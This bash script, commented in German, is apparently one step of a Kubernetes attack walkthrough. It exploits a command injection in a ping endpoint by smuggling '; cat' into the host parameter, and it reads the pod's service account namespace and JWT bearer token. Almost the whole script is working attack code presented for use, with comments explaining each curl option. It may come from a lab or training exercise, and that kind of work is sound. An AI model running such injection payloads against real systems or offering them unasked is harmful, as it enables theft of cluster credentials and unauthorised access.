#!/usr/bin/env bash
# ==============================================================================
# 5. SERVICE ACCOUNT ZUGANGSDATEN EXFILTRIEREN (TOKEN & NAMESPACE)
# ==============================================================================
# Kubernetes mountet automatisch ServiceAccount-Tokens in jeden Pod unter
# /var/run/secrets/kubernetes.io/serviceaccount/.
# Über die Command Injection lesen wir den Namespace und das JWT-Bearer-Token
# des Containers aus.
#
# Erklärung der Parameter:
# -s              : Silent-Modus für curl
# -G              : HTTP-GET-Methode
# --data-urlencode: URL-Kodierung der Befehlskette

echo "=== 1. Namespace des ServiceAccounts auslesen ==="
curl -s -G "http://localhost:5000/ping" \
  --data-urlencode "host=127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"

echo -e "\n\n=== 2. JWT-Token des ServiceAccounts auslesen ==="
curl -s -G "http://localhost:5000/ping" \
  --data-urlencode "host=127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
echo ""
